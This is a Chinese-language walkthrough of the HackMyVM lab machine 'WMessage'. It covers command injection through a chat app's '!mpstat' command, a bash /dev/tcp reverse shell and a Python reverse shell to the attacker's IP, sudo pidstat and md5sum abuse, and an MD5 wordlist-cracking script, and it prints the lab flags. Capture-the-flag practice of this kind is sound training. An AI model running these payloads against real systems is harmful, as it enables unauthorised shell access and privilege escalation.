# WMessage

2025.02.19 https://hackmyvm.eu/machines/machine.php?vm=WMessage

[video](https://www.bilibili.com/video/BV1iLAkeCE5x/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

访问首页跳转到登陆页面，可能存在 SQL 注入，经过测试暂时未发现。有一个注册页面，http://192.168.5.40/sign-up 注册个账号进入系统，发现可以发消息，并且可以执行 !mpstat 查看状态，可能存在 RCE，进行探测，输入 !mpstat:id 刷新页面后，出现 www-data，验证有 RCE，直接反弹 shenll 到 kali：

```
!mpstat;/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1'
```

得到反弹 shell:

```
www-data@MSG:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

sudo -l 发现 (messagemaster) NOPASSWD: /bin/pidstat 先提权到 messagemaster 用户：

```
sudo -u messagemaster pidstat -e /bin/bash
```

执行后，很快又被系统踢出来，不能执行交互式的命令。换另外一种方式，在 kali 上再次建立监听，然后用 python 进行反弹：

```
sudo -u messagemaster pidstat -e python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.3",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

获取到 messagemaster 用户 shell 后，得到了 user flag：

```
ea86091a17126fe48a83c1b8d13d60ab
```

sudo -l 发现：(ALL) NOPASSWD: /bin/md5sum 然后在 /var/www/ROOTPASS 中有 root 用户密码，使用 sudo 程序将其读取出来，然后进行哈希破解：

```
sudo /bin/md5sum  /var/www/ROOTPASS

85c73111b30f9ede8504bb4a4b682f48
```

hashcat 和 john 解密不出来，写了一个简单的 py 脚本进行解密：

```
import hashlib

def md5_encrypt(data):
    md5 = hashlib.md5()
    md5.update(data.encode('utf-8'))
    return md5.hexdigest()

hashStr = '85c73111b30f9ede8504bb4a4b682f48'

for line in open('/usr/share/wordlists/rockyou.txt', encoding="utf-8", errors="ignore"):
    encrypted_data = md5_encrypt(line)
    if hashStr == encrypted_data:
        print("找到PASS", line)
        break
```

得到密码 Message5687 直接 su 切换到 root，得到了 root flag:

```
root@MSG:~# cat Root.txt
a59b23da18102898b854f3034f8b8b0f
```
